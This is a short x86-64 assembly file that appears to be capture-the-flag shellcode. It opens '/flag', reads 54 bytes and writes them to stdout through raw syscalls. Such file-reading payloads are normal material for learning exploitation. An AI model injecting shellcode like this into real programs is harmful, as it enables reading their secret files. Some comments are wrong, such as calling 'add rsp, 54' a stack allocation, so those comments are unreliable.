.intel_syntax noprefix



.section .text

    mov rax, 0x67616c662f   # encoded string: /flag
    push rax                # saving on stack

    mov rdi, rsp            # address of /flag
    mov rsi, 0
    mov rdx, 0
    mov rax, 2              # open file
    syscall                 

    # reading flag
    mov rdi, rax
    add rsp, 54             # allocating space to stack -> 70 byte
    mov rsi, rsp            # rsi = buffer on stack address
    mov rdx, 54
    mov rax, 0
    syscall

    mov rdi, 1
    mov rsi, rsp
    mov rdx, 54
    mov rax, 1
    syscall

    mov rax, 60
    mov rdi, 0
    syscall